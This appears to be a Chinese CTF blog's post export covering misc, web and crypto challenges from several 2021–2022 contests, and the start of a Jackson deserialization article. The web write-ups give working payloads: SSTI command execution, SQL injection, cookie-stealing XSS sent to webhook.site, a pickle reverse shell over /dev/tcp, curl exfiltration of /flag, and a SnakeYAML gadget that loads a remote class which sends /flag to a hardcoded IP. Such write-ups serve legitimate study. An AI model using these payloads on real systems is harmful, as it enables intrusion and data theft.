{"posts":[{"title":"AntCTF &amp; Dˆ3CTF-2022-复盘","text":"MISCBadw3ter下载下来得到的是一个损坏了头部的wav文件，尝试进行修复： 相关知识点：https://docs.fileformat.com/audio/wav/ 根据题目描述，联想到Deepsound（https://deepsound.soft112.com/）这个信息隐藏工具，由于提取文件需要工具，而在最开始给的文件头部被修改的部分是明文，将其拼接起来 ：CUY1nw31lai ，用于文件提取： 得到一个png图片，但是打不开，winhex打开查看文件头为：49492A00 （可用在线网站查询https://www.tooleyes.com/app/file_signature.html） 将文件后缀改为tiff后即可打开，但是二维码扫描后发现并不是。仔细看可以看到二维码并不是黑白二值图，在ps中打开，查看曲线图： 可以看到，灰度图存在三种颜色，分别为黑色、灰色和白色，既然黑白不是不行，那能不能试试灰黑呢（黑色模式），可以将背景板曝光度调到最低让它变成黑色或者直接加一个黑色的背景板： 然后识别二维码，就得到了flag。","link":"/2022/03/08/AntCTF-D%CB%863CTF-2022-%E5%A4%8D%E7%9B%98/"},{"title":"2021第五空间线上赛-WEB-WebFTP","text":"从github搞到源码进行分析https://github.com/wifeat/WebFTP 发现存在测试功能页面Readme/mytz.php 通过这里可以看到phpinfo，在全局变量中找到flag flag{g28F28EPTjRoxM9sNBDtMS3ZPuIPXL6A}","link":"/2021/09/24/2021%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E7%BA%BF%E4%B8%8A%E8%B5%9B-WEB-WebFTP/"},{"title":"DiceCTF-2022-WP","text":"一共十道题，只做出来8道，剩下两道完全找不到漏洞点，等大佬wp @_@ 。这比赛的题目顺序有点迷，并没有按照难度排列，做的时候有点过山车的感觉，不过总体体验还是不错的。 secure-page直接看源码，只需要把cookie中的admin设为true即可。 1234567891011121314151617181920212223242526@server.get('/')async def root(request): admin = request.cookies.get('admin', '') headers = {} if admin == '': headers['set-cookie'] = 'admin=false' if admin == 'true': return (200, ''' &lt;title&gt;Secure Page&lt;/title&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;/style.css&quot; /&gt; &lt;div class=&quot;container&quot;&gt; &lt;h1&gt;Secure Page&lt;/h1&gt; %s &lt;/div&gt; ''' % os.environ.get('FLAG', 'flag is missing!'), headers) else: return (200, ''' &lt;title&gt;Secure Page&lt;/title&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;/style.css&quot; /&gt; &lt;div class=&quot;container&quot;&gt; &lt;h1&gt;Secure Page&lt;/h1&gt; Sorry, you must be the admin to view this content! &lt;/div&gt; ''', headers) hope{signatures_signatures_signatures} flag-viewer从源码可以看到只需要访问/flag目录并把参数user设为admin即可。 123456789@server.post('/flag')async def flag(request): data = await request.post() user = data.get(' ', '') if user != 'admin': return (302, '/?message=Only the &quot;admin&quot; user can see the flag!') return (302, f'/?message={os.environ.get(&quot;FLAG&quot;, &quot;flag missing!&quot;)}') hope{oops_client_side_validation_again} point源码给出来，用post发送json数据，只要恢复得到的结构体成员值为that_point即可，但是不能够含有what_point字段，因为json.Unmarshal不区分json字段的大小写，因此可以把键名what_point写成What_point来绕过检查。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051type importantStuff struct { Whatpoint string `json:&quot;what_point&quot;`}func main() { flag, err := os.ReadFile(&quot;flag.txt&quot;) if err != nil { panic(err) } http.HandleFunc(&quot;/&quot;, func(w http.ResponseWriter, r *http.Request) { switch r.Method { case http.MethodGet: fmt.Fprint(w, &quot;Hello, world&quot;) return case http.MethodPost: body, err := io.ReadAll(r.Body) fmt.Printf(&quot;%s&quot;, body) if err != nil { fmt.Fprintf(w, &quot;1 Something went wrong&quot;) return } if strings.Contains(string(body), &quot;what_point&quot;) || strings.Contains(string(body), &quot;\\\\&quot;) { fmt.Fprintf(w, &quot;2 Something went wrong&quot;) return } var whatpoint importantStuff err = json.Unmarshal(body, &amp;whatpoint) if err != nil { fmt.Fprintf(w, &quot;3 Something went wrong&quot;) return } if whatpoint.Whatpoint == &quot;that_point&quot; { fmt.Fprintf(w, &quot;Congrats! Here is the flag: %s&quot;, flag) return } else { fmt.Fprintf(w, &quot;4 Something went wrong&quot;) return } default: fmt.Fprint(w, &quot;Method not allowed&quot;) return } }) log.Fatal(http.ListenAndServe(&quot;:1234&quot;, nil))} hope{cA5e_anD_P0iNt_Ar3_1mp0rT4nT} reverser这是一道ssti注入题，需要注意的是payload要取反，因为是python3所以需要找一下FileLoader，然后按照常规套路利用builtins中的函数调用系统命令读取flag即可。 12345678910111213141516@app.post('/')def reverse(): result = ''' &lt;link rel=&quot;stylesheet&quot; href=&quot;style.css&quot; /&gt; &lt;div class=&quot;container&quot;&gt; &lt;h1&gt;Text Reverser&lt;/h1&gt; Reverse any text... now as a web service! &lt;form method=&quot;POST&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;text&quot;&gt; &lt;input type=&quot;submit&quot; value=&quot;Reverse&quot;&gt; &lt;/form&gt; &lt;p&gt;Output: %s&lt;/p&gt; &lt;/div&gt; ''' output = request.form.get('text', '')[::-1] return render_template_string(result % output) payload如下： 1}})(daer.)'sl'(nepop.)'so'(]'__tropmi__'[]'__snitliub__'[__slabolg__.__tini__.]49[)(__sessalcbus__.__esab__.)'__ssal'+'c__'(__etubirttateg__.][{{ 1}})(daer.)'*f%20tac'(nepop.)'so'(]'__tropmi__'[]'__snitliub__'[__slabolg__.__tini__.]49[)(__sessalcbus__.__esab__.)'__ssal'+'c__'(__etubirttateg__.][{{ hope{cant_misuse_templates} oeps一开始看到execute的时候觉得完了，滴水不漏，定睛一看才发现原来里面用了单引号把占位符包起来了，那就起不到防止sql注入的效果，可以直接注。找了一圈发现基本上都有输入检查，只允许字母和数字输入，唯独一个地方没有检查那就是/submit目录下的submission参数，这里可以直接进行注入。 1234567891011121314151617181920212223242526272829@server.post('/submit')async def submit(request): token = request.cookies.get('token', '') logged_in = ( all(c in ALLOWED_CHARACTERS for c in token) and len(connection.execute(''' select * from users where token = '%s'; ''' % token).fetchall()) == 1 ) if not logged_in: return (302, '/?error=Authentication error.') data = await request.post() submission = data.get('submission', '') if submission == '': return (302, '/?error=Submission cannot be empty.') stripped = submission.replace(' ', '') if stripped != stripped[::-1]: return (302, '/?error=Submission must be a palindrome.') connection.execute(''' insert into pending (user, sentence) values ('%s', '%s'); ''' % ( token, submission )) return (302, '/') 与往常的不同，不再是select，而是insert语句。这里插入的是pending数据表，也就是我们访问根目录可以看到的数据表。因此可以将flag查询出来插入pending表中，再访问根目录查看。需要注意的是在python的sqlite中可以使用||进行字符拼接，这里将前面的字符闭合起来之后再将flag拼接上去即可： 1flag:'||(select flag from flags));----;))sgalf morf galf tceles(||':galf 访问根目录查看flag： hope{ecid_gnivlovni_semordnilap_fo_kniht_ton_dluoc} inspect-me这道题挺恶心的，F12开启开发者工具之后就会把表单后面的内容替换掉，然后不断循环刷新控制台。一开始只能获取到表单前面那部分的代码，发现他会检测窗口大小等一系列操作来判断是否开启开发者工具，所以一开始我的思路是用chromedriver来控制开启页面，然后用page_source来获取源码，但是发现不行因为chromedriver本来就是调用了开发者工具来实现的，会被检查出来。 ! 经过仔细研究发现页面内容替换需要条件触发，而检测这些触发条件的是js代码，他们的作用范围只在本标签，那么标签的上一级他就管不到了。所以可以直接选中浏览器地址栏url然后按ctrl+u直接看源码。以下是表单后面的源码，实现的是对flag进行凯撒加密，偏移量为13。 1234567891011121314151617181920212223242526272829303132&lt;script&gt; (() =&gt; { const scripts = document.querySelectorAll('script'); scripts.forEach((script) =&gt; script.remove()); const chr = (c) =&gt; c.charCodeAt(0); const form = document.querySelector('form'); form.addEventListener('submit', (event) =&gt; { event.preventDefault(); const input = document.querySelector('input[type=&quot;text&quot;]'); const output = []; for (const char of input.value.split('').map(chr)) { if (chr('a') &lt;= char &amp;&amp; char &lt;= chr('z')) { output.push(chr('a') + ((char - chr('a') + 13) % 26)); } else if (chr('A') &lt;= char &amp;&amp; char &lt;= chr('Z')) { output.push(chr('A') + ((char - chr('A') + 13) % 26)); } else { output.push(char); } } const target = 'ubcr{pyvrag_fvqr_pyvpur}'; if (output.map((c) =&gt; String.fromCharCode(c)).join('') === target) { document.querySelector('.content').textContent = 'Correct!'; } else { input.removeAttribute('style'); input.offsetWidth; input.style.animation = 'shake 0.25s'; } }); })();&lt;/script&gt; hope{client_side_cliche} pastebin服务端提供/new来给我们创建一个页面，随后会给出地址供访问，题目大概的思路就是利用/new生成带有xss代码的页面，然后把这个页面提交给admin-bot访问，admin-bot访问我们生成的页面时利用xss代码将cookie外带即可。 1234567891011121314151617181920212223242526app.post('/new', (req, res) =&gt; { const paste = (req.body.paste ?? '').toString(); if (paste.length == 0) { return res.redirect(`/flash?message=Paste cannot be empty!`); } if (paste.search(/&lt;.*&gt;/) !== -1) { return res.redirect(`/flash?message=Illegal characters in paste!`); } const id = add(paste); res.redirect(`/view/${id}`);});app.get('/view/:id', (req, res) =&gt; { const id = req.params.id; res.type('html'); res.end(` &lt;link rel=&quot;stylesheet&quot; href=&quot;/style.css&quot; /&gt; &lt;div class=&quot;container&quot;&gt; &lt;h1&gt;Paste&lt;/h1&gt; ${pastes.get(id) ?? 'Paste does not exist!'} &lt;/div&gt; `);}); 从上面的源码可以看到，写入的内容是会有检查的，不能够含有&lt;&gt;，这里需要xss绕过。我们可以使用iframe的半尖括号来进行绕过，然后在src中写入js代码实现cookie窃取，payload如下： 1&lt;iframe src= javascript:location.href=&quot;https://webhook.site/99f07c43-3dd0-402e-afc8-a654a2dc6983/?flag=&quot;+document.cookie &lt; 再将如下链接提交给Admin Bot访问即可： 1https://pastebin.mc.ax/view/54c293d08e3c57c75ddee9af984431c1 提交之后就可以在我们实现准备好的webhook这里查看flag。 hope{the_pastebin_was_irrelvant} mk这道题也是xss，不过他的限制比较严格，内容安全策略（CSP）如下，除了谷歌的验证码域名外，其他的都需要遵循同源策略，而且script不允许内联代码运行，这里需要绕过CSP。 12345678910111213141516fastify.addHook('preHandler', async (req, res) =&gt; { res.header('Content-Security-Policy', [ &quot;default-src 'self'&quot;, &quot;base-uri 'self'&quot;, &quot;font-src 'self'&quot;, &quot;frame-ancestors 'none'&quot;, &quot;img-src 'none'&quot;, &quot;object-src 'none'&quot;, &quot;script-src 'self' 'unsafe-eval' https://www.google.com/recaptcha/ https://www.gstatic.com/recaptcha/&quot;, &quot;script-src-attr 'none'&quot;, &quot;style-src 'self' 'unsafe-inline'&quot;, &quot;frame-src https://www.google.com/recaptcha/ https://recaptcha.google.com/recaptcha/&quot; ].join(';')); res.header('X-Content-Type-Options', 'nosniff');}); 可以注意到源码给出了Mathjax这个插件，这其实是一个数学公式的渲染插件，之前确实爆过xss攻击的漏洞，可以直接执行eval函数来进行RCE，但是这里给出的版本是2.7.9并不包含这个漏洞，这里就不能用。但是插件Mathjax允许通过&lt;script type=&quot;text/x-mathjax-config&quot;&gt;&lt;script/&gt;来进行参数设置，同时标签内除了根据它规定的格式设置参数之外还可以运行JavaScript代码，因此就可以利用它来绕过CSP执行JavaScript代码，从而走私cookie。 构造的页面payload如下： 12345678910111213141516&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;script type=&quot;text/x-mathjax-config&quot;&gt; location.href=`https://webhook.site/99f07c43-3dd0-402e-afc8-a654a2dc6983/?${document.cookie}`; &lt;/script&gt; &lt;script type=&quot;text/javascript&quot; src=&quot;/MathJax/MathJax.js&quot;&gt; &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 将payload与其https://mk.mc.ax/render?content= 拼接后url编码，再发送给admin-bot访问，admin-bot加载页面后就会运行准备好的跳转代码，将cookie作为参数发送到事先准备好的webhook地址。 1https%3A%2F%2Fmk.mc.ax%2Frender%3Fcontent%3D%3C!DOCTYPE%20html%3E%20%3Chtml%20lang%3D%22en%22%3E%20%3Chead%3E%20%20%20%20%20%3Cmeta%20charset%3D%22UTF-8%22%3E%20%20%20%20%20%3Cmeta%20http-equiv%3D%22X-UA-Compatible%22%20content%3D%22IE%3Dedge%22%3E%20%20%20%20%20%3Cmeta%20name%3D%22viewport%22%20content%3D%22width%3Ddevice-width%2C%20initial-scale%3D1.0%22%3E%20%20%20%20%20%3Ctitle%3EDocument%3C%2Ftitle%3E%20%3C%2Fhead%3E%20%3Cbody%3E%20%20%20%20%20%3Cscript%20type%3D%22text%2Fx-mathjax-config%22%3E%20%20%20%20%20%20%20%20%20location.href%3D%60https%3A%2F%2Fwebhook.site%2F99f07c43-3dd0-402e-afc8-a654a2dc6983%2F%3F%24%7Bdocument.cookie%7D%60%3B%20%20%20%20%20%3C%2Fscript%3E%20%20%20%20%20%3Cscript%20type%3D%22text%2Fjavascript%22%20src%3D%22%2FMathJax%2FMathJax.js%22%3E%20%20%20%20%20%3C%2Fscript%3E%20%3C%2Fbody%3E%20%3C%2Fhtml%3E 然后我们就可以在webhook这里看到flag了。 hope{make_sure_to_check_your_dependencies}","link":"/2022/07/25/DiceCTF-2022-WP/"},{"title":"CISCNCTF2022 初赛 WP","text":"CRYPTO签到电台按公众号提示 密文+密码本 模10 得到密码 1732 2514 1344 0356 0451 6671 0055 1116 8739 2160 4882 4331 7393 0019 2848 0243 3404 4138 4782 3964 0064 开启会话 http://eci-2zeh1c14i16ne6hcxxxb.cloudeci1.ichunqiu.com:8888/send?msg=s 发送电报 http://eci-2zeh1c14i16ne6hcxxxb.cloudeci1.ichunqiu.com:8888/send?msg=2848024334044138478239640064 flag{50c75dee-dc65-4dc1-83c1-6d220643e513} 基于挑战码的双向认证3ssh连接，su提权，密码toor flag{7b352ef0-1bb1-41af-a7d7-b74f62ff23f0} WEBezpop参考 ：https://www.icode9.com/content-1-1367188.html flag{0b9c9b72-0f36-464e-b4a4-bd1ea26e5e63}","link":"/2022/06/01/CISCNCTF2022-%E5%88%9D%E8%B5%9B-WP/"},{"title":"Dest0g3 520迎新赛 WP","text":"忙到比赛快结束了才开始打 *.* WEBphpdestrequire_once 绕过不能重复包含文件的限制 poc如下： 1php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php flag:Dest0g3{26291723-ac8b-4776-95e6-65be65455960} 相关知识点学习：php源码分析 require_once 绕过不能重复包含文件的限制 https://www.anquanke.com/post/id/213235 EasyPHP 字符串拼接出错即可引发错误输出flag，直接发一个数组即可. flag:Dest0g3{d06f2820-8493-4d29-b470-f265b23b199f} SimpleRCE利用十六进制转ASCII绕过system禁用，再用head读取文件 flag:Dest0g3{fb501803-e3af-4a13-8736-a1752ec324c9} funny_upload限制上传php文件，文件内容无法带有&lt;?php。于是先上传一个eval.jpg文件 再用 .htaccess 的将其解析为php文件，同时加上php_value auto_prepend_file /flag将flag进来： 再访问eval.jpg即可看到flag： flag:Dest0g3{6a131d9c-4c4b-44a5-b040-0264f42966a5} 相关知识点学习：与 .htaccess 相关的奇淫技巧 https://www.anquanke.com/post/id/241147#h3-11 middle一道简单的Pickle反序列化，看源码利用思路很简单：构造opcode让服务器调用config下的backdoor函数进行远程代码执行。 需要注意这个是无回显的，可以利用反弹shell： 1234567891011121314import requestsimport base64opcode=b'''cconfigbackdoor((S'os.system(&quot;#bash -i &gt;&amp; /dev/tcp/ip/1234 0&gt;&amp;1'S'&quot;)'ltR.'''payload=base64.b64encode(opcode)print(payload)p=requests.post(url=&quot;http://a109323d-13f4-4417-97d8-0af8e6dbc36c.node4.buuoj.cn:81/home&quot;,data={&quot;data&quot;: payload})print(p.text)#服务器运行 nc -lnvp 1234 比赛的时候因为自己的机子不知道啥原因就是弹不了，也就有了下面这个操作，先用把命令执行结果输出到文件后再把通过curl命令把执行结果发送出来： 12345678910111213141516import requestsimport base64opcode=b'''cconfigbackdoor((S'os.system(&quot;curl -F \\'ls / &gt; /flag&amp;curl -F \\'file=@/flag\\' https://webhook.site/68149089-5dbe-48b2-a13f-ff9718771340'S'&quot;)'ltR.'''#file=@/flag.txt\\' https://webhook.site/68149089-5dbe-48b2-a13f-ff9718771340payload=base64.b64encode(opcode)print(payload)p=requests.post(url=&quot;http://a109323d-13f4-4417-97d8-0af8e6dbc36c.node4.buuoj.cn:81/home&quot;,data={&quot;data&quot;: payload})print(p.text) Dest0g3{a18d0ee5-5bb2-45aa-8d99-89ce75b1f06e} 相关知识点学习：Pickle反序列化 https://goodapple.top/archives/1069 MISC你知道js吗拿到flag，打开可以看到明显是一个word文件，添加.docx后缀打开，将文本文件复制后发现是base64，解码得到其中一串只有+-.&lt;&gt;[]的字符串 12345678910111213141516+++++ ++[-&gt; +++++ ++&lt;]&gt; +++.. ++.-. ++.-- --.++ ++.-- -.-.- --.++ ++++.+.--- -..++ ++.&lt;+ ++[-&gt; +++&lt;] &gt;++.&lt; +++[- &gt;---&lt; ]&gt;--- ---.+ ++++. -----.+++. ...-- ---.+ ++++. ---.+ ++.-- ---.+ ++++. ---.. +++++ +.--- ----.&lt;++++ [-&gt;++ ++&lt;]&gt; ++.&lt;+ +++[- &gt;---- &lt;]&gt;-. ---.+ +++++ .---- -.++. ++.+.--.-- .&lt;+++ +[-&gt;+ +++&lt;] &gt;++.&lt; ++++[ -&gt;--- -&lt;]&gt;- .+.-. ---.+ ++.+. -.++++.--- --.&lt;+ +++[- &gt;++++ &lt;]&gt;++ .&lt;+++ [-&gt;-- -&lt;]&gt;- ----. ----. +.+++ +.----.--- .+++. -..&lt;+ +++[- &gt;++++ &lt;]&gt;++ .&lt;+++ +[-&gt;- ---&lt;] &gt;-.++ +++.- ----.+++.. ---.+ ++.-- --.+. ..+++ +.-.- ----. +++++ .---- .+.++ ++.-- --.++++.-. ----. +.-.+ ++++. &lt;+++[ -&gt;+++ &lt;]&gt;++ ++.&lt; Brainfuck解码得到446573743067337B38366661636163392D306135642D343034372D623730322D3836636233376162373762327D，十六进制转为字符串即可得到flag。 flag: Dest0g3{86facac9-0a5d-4047-b702-86cb37ab77b2} Pngenius附件给的png用binwalk提取可以得到一个加密的压缩包， 用Stegsolve查看png图片可以发现RGB三个通道最低为存在lsb隐写，提取得到压缩包密码Weak_Pas5w0rd， 解压得到flag。 flag: Dest0g3{2908C1AA-B2C1-B8E6-89D1-21B97D778603} CRYPTObabyRSAyafu直接分解n 1234567891011from Crypto.Util.number import long_to_bytesimport gmpy2e = 65537n=27272410937497615429184017335437367466288981498585803398561456300019447702001403165885200936510173980380489828828523983388730026101865884520679872671569532101708469344562155718974222196684544003071765625134489632331414011555536130289106822732544904502428727133498239161324625698270381715640332111381465813621908465311076678337695819124178638737015840941223342176563458181918865641701282965455705790456658431641632470787689389714643528968037519265144919465402561959014798324908010947632834281698638848683632113623788303921939908168450492197671761167009855312820364427648296494571794298105543758141065915257674305081267c=14181751948841206148995320731138166924841307246014981115736748934451763670304308496261846056687977917728671991049712129745906089287169170294259856601300717330153987080212591008738712344004443623518040786009771108879196701679833782022875324499201475522241396314392429412747392203809125245393462952461525539673218721341853515099201642769577031724762640317081252046606564108211626446676911167979492329012381654087618979631924439276786566078856385835786995011067720124277812004808431347148593882791476391944410064371926611180496847010107167486521927340045188960373155894717498700488982910217850877130989318706580155251854p1 = 165143607013706756535226162768509114446233024193609895145003307138652758365886458917899911435630452642271040480670481691733000313754732183700991227511971005378010205097929462099354944574007393761811271098947894183507596772524174007304430976545608980195888302421142266401500880413925699125132100053801973971467p2 = 165143607013706756535226162768509114446233024193609895145003307138652758365886458917899911435630452642271040480670481691733000313754732183700991227511971005378010205097929462099354944574007393761811271098947894183507596772524174007304430976545608980195888302421142266401500880413925699125132100053801973969401phi=(p1-1)*(p2-1)d=gmpy2.invert(e,phi)m=long_to_bytes(pow(c,d,n))print(m) flag: Dest0g3{96411aad-032c-20a8-bc43-b473f6f08536} babyAES直接解密 1234567from Crypto.Cipher import AESc=b'C4:\\x86Q$\\xb0\\xd1\\x1b\\xa9L\\x00\\xad\\xa3\\xff\\x96 hJ\\x1b~\\x1c\\xd1y\\x87A\\xfe0\\xe2\\xfb\\xc7\\xb7\\x7f^\\xc8\\x9aP\\xdaX\\xc6\\xdf\\x17l=K\\x95\\xd07'iv=b'\\xd1\\xdf\\x8f)\\x08w\\xde\\xf9yX%\\xca[\\xcb\\x18\\x80'key=b'\\xa4\\xa6M\\xab{\\xf6\\x97\\x94&gt;hK\\x9bBe]F'my_aes = AES.new(key, AES.MODE_CBC, iv)m = my_aes.decrypt(c)print(m) flag: Dest0g3{d0e5fa76-e50f-76f6-9cf1-b6c2d576b6f4} ezDLPsagemath一把梭 12345y = 199533304296625406955683944856330940256037859126142372412254741689676902594083385071807594584589647225039650850524873289407540031812171301348304158895770989218721006018956756841251888659321582420167478909768740235321161096806581684857660007735707550914742749524818990843357217489433410647994417860374972468061110200554531819987204852047401539211300639165417994955609002932104372266583569468915607415521035920169948704261625320990186754910551780290421057403512785617970138903967874651050299914974180360347163879160470918945383706463326470519550909277678697788304151342226439850677611170439191913555562326538607106089620201074331099713506536192957054173076913374098400489398228161089007898192779738439912595619813699711049380213926849110877231503068464392648816891183318112570732792516076618174144968844351282497993164926346337121313644001762196098432060141494704659769545012678386821212213326455045335220435963683095439867976162p = 335215034881592512312398694238485179340610060759881511231472142277527176340784432381542726029524727833039074808456839870641607412102746854257629226877248337002993023452385472058106944014653401647033456174126976474875859099023703472904735779212010820524934972736276889281087909166017427905825553503050645575935980580803899122224368875197728677516907272452047278523846912786938173456942568602502013001099009776563388736434564541041529106817380347284002060811645842312648498340150736573246893588079033524476111268686138924892091575797329915240849862827621736832883215569687974368499436632617425922744658912248644475097139485785819369867604176912652851123185884810544172785948158330991257118563772736929105360124222843930130347670027236797458715653361366862282591170630650344062377644570729478796795124594909835004189813214758026703689710017334501371279295621820181402191463184275851324378938021156631501330660825566054528793444353g = 19x = discrete_log(mod(y, p), mod(g, p))print(hex(x)) flag: Dest0g3{07ed2a6f-182f-a05d-c81e-1318af820a78}","link":"/2022/06/01/Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B-WP/"},{"title":"DSCTF-2022-复盘","text":"Webeasy_yaml进入赛题页面直接F12或ctrl+U查看源码可以看到部分代码： 123456789101112131415161718192021222324252627282930 public ShiroFilterFactoryBean shiroFilter() { ShiroFilterFactoryBean bean = new ShiroFilterFactoryBean(); bean.setSecurityManager((org.apache.shiro.mgt.SecurityManager) securityManager()); bean.setLoginUrl(&quot;/login&quot;); Map&lt;String, String&gt; filterMap = new LinkedHashMap&lt;&gt;(); filterMap.put(&quot;/static/*&quot;,&quot;anon&quot;); filterMap.put(&quot;/load/*&quot;, &quot;authc&quot;); bean.setFilterChainDefinitionMap(filterMap); return bean; } @PostMapping(value = &quot;/load/{id}&quot;) @ResponseBody public String loadyaml(@PathVariable(name = &quot;id&quot;) String id, @RequestParam(name = &quot;persondata&quot;, defaultValue = &quot;&quot;) String persondata) throws IOException, ClassNotFoundException { Yaml yaml = new Yaml(); Person p = yaml.loadAs(persondata, Person.class); return p.username; } public class Address { public String street; public Object ext; public boolean isValid;}public class Person { public String username; public String age; public boolean isLogin; public Address address;} 要访问/load/目录必须通过身份认证，但是从给出的源码并没有任何登录的信息，猜测需要绕过身份认证。试了好几个shiro认证绕过，发现/load/%3bxpoint可以绕过成功，即加一个%3b 也就是 ; 的url编码，也就是CVE-2020-13933。这里参考的是：《Java安全之Shiro权限绕过》 https://www.cnblogs.com/nice0e3/p/16248252.html 。 绕过认证之后即可进入到/load/目录进行下一步操作。可以看到，这里是用 yaml.loadAs() 函数将我们发送的yaml数据以Person类进行加载，下面也给出了Person类的构造，其中username在代码执行顺利的情况下会有回显，参数address则被指定为前面给出的Address类型，而这个类中就有一个参数能够利用，即ext，它能够反序列化为任意类，我们能够在这个地方构造恶意类来getshell。手动构造yaml数据如下： 12345678username: xp0intage: 11isLogin: trueaddress: street: xp0int ext: 恶意类 isValid: true 恶意类的构造也会参照了mi1k7ea师傅的博客：《Java SnakeYaml反序列化漏洞》 https://www.mi1k7ea.com/2019/11/29/Java-SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E 这篇文章也汇总了很多其他的一些漏洞。 1234567!!javax.script.ScriptEngineManager [ !!java.net.URLClassLoader [ [ !!java.net.URL [&quot;http://ip:1234/&quot;] ] ]] 这使用了ScriptEngineManager类进行构造，本质上来讲是SPI机制，客户端通过访问服务端的目录下的META-INF/services文件获取自定义实现的类的1类名，再通过Class.forName来进行加载。这也是看了nice0e3师傅的文章学习到的： 《Java安全之SnakeYaml反序列化分析》https://www.cnblogs.com/nice0e3/p/14514882.html 。 那么剩下的问题就是构造一个恶意类并搭建起提供加载服务的Web应用了，这里可以直接下载github上的项目来快速搭建https://github.com/artsploit/yaml-payload。首先需要修改项目中/src/artsploit/目录下的 AwesomeScriptEngineFactory.java文件，讲函数AwesomeScriptEngineFactory() 的内容修改为我们要执行的代码，随后进行编译在/src/artsploit/目录下生成AwesomeScriptEngineFactory.class。 1javac src/artsploit/AwesomeScriptEngineFactory.java 随后将/src/文件夹搬到vps上，用python开启简单的web服务即可。 1python -m http.server --cgi 1234 在远程恶意服务准备好之后就可以开始发送准备好的yaml数据了： 1234567891011121314username: xp0intage: 11isLogin: trueaddress: street: xp0int ext: !!javax.script.ScriptEngineManager [ !!java.net.URLClassLoader [ [ !!java.net.URL [&quot;http://ip:1234/&quot;] ] ] ] isValid: true 将以上内容进行url编码，发送到目标网站，随后即会触发反序列化加载远程恶意类读取flag。 在比赛时用Runtime.getRuntime().exec()进行反弹shell，但是一直都没反应，整了好久怀疑是自己的恶意服务没构造好，等着看到W&amp;M的wp：https://blog.wm-team.cn/index.php/archives/21/ 后才想起来，有可能这个方法被禁用了，用其他方式就好了，例如W&amp;M的师傅直接读flag，然后将其构造为GET方法的参数访问自己vps上的服务即可看到get flag。 趁着环境还没关赶紧进行复现。 远程恶意类代码主体如下： 1234567891011public class AwesomeScriptEngineFactory implements ScriptEngineFactory { public AwesomeScriptEngineFactory() { try { // Runtime.getRuntime().exec(&quot;curl https://webhook.site/fb838a03-6b64-404d-a48a-ad6174d83975&quot;); // Runtime.getRuntime().exec(&quot;bash -c {echo,YmFzaCUyMC1pJTIwJTNFJTI2L2Rldi90Y3AvMTE5LjkxLjIzOS45OC8yMzMzMyUyMDAlM0UlMjYx}|{base64,-d}|{bash,-i}&quot;); new java.net.URL(&quot;http://119.91.239.98:1234/?a=&quot;+new java.io.BufferedReader(new java.io.FileReader(&quot;/flag&quot;)).readLine()).openConnection().getInputStream(); } catch (IOException e) { e.printStackTrace(); } } 最终payload如下： 123456789101112POST /load/%3bxp0int HTTP/1.1Host: 39.105.38.203:30113Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 929persondata=%75%73%65%72%6e%61%6d%65%3a%20%78%70%30%69%6e%74%0a%61%67%65%3a%20%31%31%0a%69%73%4c%6f%67%69%6e%3a%20%74%72%75%65%0a%61%64%64%72%65%73%73%3a%20%0a%20%20%20%20%73%74%72%65%65%74%3a%20%78%70%30%69%6e%74%0a%20%20%20%20%65%78%74%3a%20%0a%20%20%20%20%20%20%20%20%21%21%6a%61%76%61%78%2e%73%63%72%69%70%74%2e%53%63%72%69%70%74%45%6e%67%69%6e%65%4d%61%6e%61%67%65%72%20%5b%0a%20%20%20%20%20%20%20%20%20%20%20%20%21%21%6a%61%76%61%2e%6e%65%74%2e%55%52%4c%43%6c%61%73%73%4c%6f%61%64%65%72%20%5b%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%5b%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%21%21%6a%61%76%61%2e%6e%65%74%2e%55%52%4c%20%5b%22%68%74%74%70%3a%2f%2f%69%70%3a%31%32%33%34%2f%22%5d%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%5d%0a%20%20%20%20%20%20%20%20%20%20%20%20%5d%0a%20%20%20%20%20%20%20%20%5d%0a%20%20%20%20%69%73%56%61%6c%69%64%3a%20%74%72%75%65","link":"/2022/07/17/DSCTF-2022-%E5%A4%8D%E7%9B%98/"},{"title":"Jackson反序列化","text":"一、简介Jackson是最流行的JSON解析器之一，具有很多的优先，如：依赖的jar包较少、解析速度快、运行时占用内存低、性能较好、简单易用等。 Jackson具有三大核心组件： jackson-core，核心包，提供基于”流模式”解析的相关 API，包括 JsonPaser 和 JsonGenerator。 jackson-annotations，注解包，提供标准注解功能。 jackson-databind ，数据绑定包， 提供基于”对象绑定” 解析的相关 API （ ObjectMapper ） 和”树模型” 解析的相关 API （JsonNode）。 maven依赖 1234567891011121314151617&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt; &lt;artifactId&gt;jackson-databind&lt;/artifactId&gt; &lt;version&gt;2.9.3&lt;/version&gt; &lt;/dependency&gt; 